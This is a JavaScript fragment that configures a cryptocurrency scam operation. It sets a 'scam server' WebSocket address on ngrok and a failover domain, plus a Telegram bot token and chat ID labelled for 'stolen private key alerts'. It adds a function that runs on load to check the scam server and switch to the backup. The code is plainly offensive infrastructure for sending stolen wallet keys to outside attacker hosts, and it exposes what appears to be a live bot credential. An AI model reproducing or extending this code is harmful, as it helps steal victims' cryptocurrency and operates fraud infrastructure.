// ✅ WebSocket scam server (update this if Ngrok/VPS URL changes)
const SCAM_SERVER = "wss://b0ed-41-96-9-150.ngrok-free.app";  // Use the correct Ngrok/VPS WebSocket URL

// ✅ Telegram bot configuration (for stolen private key alerts)
const TELEGRAM_BOT_TOKEN = "8001637745:AAHoM9PCHgiKlJp466D7g7mksDo5iAnb5jM";  
const TELEGRAM_CHAT_ID = "8059448119";  

// ✅ Failover server in case the primary WebSocket fails
const FAILOVER_SERVER = "wss://backup-scammerserver.com";  

// ✅ Function to validate WebSocket connection
function validateScamServer() {
    fetch(SCAM_SERVER.replace("wss://", "https://") + "/test")
        .then(response => {
            if (!response.ok) throw new Error("Scam server unreachable.");
            console.log("✅ Scam server is active:", SCAM_SERVER);
        })
        .catch(error => {
            console.error("❌ Scam server failed, switching to failover:", error);
            window.SCAM_SERVER = FAILOVER_SERVER;  // Use backup server
        });
}

// ✅ Run validation check on script load
validateScamServer();
